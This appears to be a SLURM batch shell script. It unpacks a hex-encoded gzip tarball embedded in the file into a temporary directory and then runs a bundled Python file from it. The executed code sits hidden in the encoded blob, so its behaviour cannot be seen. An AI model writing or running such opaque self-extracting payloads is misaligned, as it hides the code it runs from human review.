#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bceaf1072b10d048a6ccb5f2972dc7d876d97a128189b4e9426b621296bb361ff7d921d14190aecd676c3f81c2ccb165f4aa42809be377d77f3aa08472ec4d88a97ad4853f9fc3e7dcf8bbcb861e275a735713216b473f916befe427ecc6dff80dd7cc5e6b0117192ca2c2fca6abe60f301ce871e9a7bb38324cbfd0899c85cd622ce3086bc8caba2aa92b8d90801799c6093950542d64a104983522469d2d6599c22c0a64deab2c66bd5cdd9a271a2595a56952cfc9f0374d7ce20c7a6914d8bb26a522821872c299d634059c79528da642373481b88b3148bb4accb38cf404ad936226ddbf9cff78eedbf80e0c3f9d57dfcb9fee3387e51ff52a654ff6f813a0ebdb6cc9ccdc25f048b1d98dd416d162e28ad3ae0acd5fd910d60fd477619fcd175677aed9bd01972d0db6f5fe3bbe8b65e7b0deeebdb84a15e0662bc5d82886b74256ff1c986513483c934580ebadf636d97757f3c9e3a65cfcbfdfe8ca76e1b44cbfa6b309e4cc19d97b1dbefc10c8c41e7fe32453e1d15214ce2e379e2d4f90e9f1ab545e35cadd74ee5f7632cb89b3d2abb6397f5f17ec02e848881617635636daf1932d58d1da65ad6f59621efe088dc6f146bbc7518f4bade816eee77b15806d1aaee3babba135edb28e31d8411739201e781571dd73dc9457cf0722b0dca20fb0287137ed0bad761f0b933d0fa490c271b444e7258bb500ec17232bc1dbc2576961f1f1aa5c3a963d69ff40917f8a48cbdef1fc65ee4863e6a65f1121ccb5d0234d4769c184e59f109f149f439e6aaf3110ec5c2581d8e4edddf710b5c2d98effbe7ad7004d5cdfc23d4d1ecbdf73241100441100441100441100441100441100441100441fcaffc0233f6543c00280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
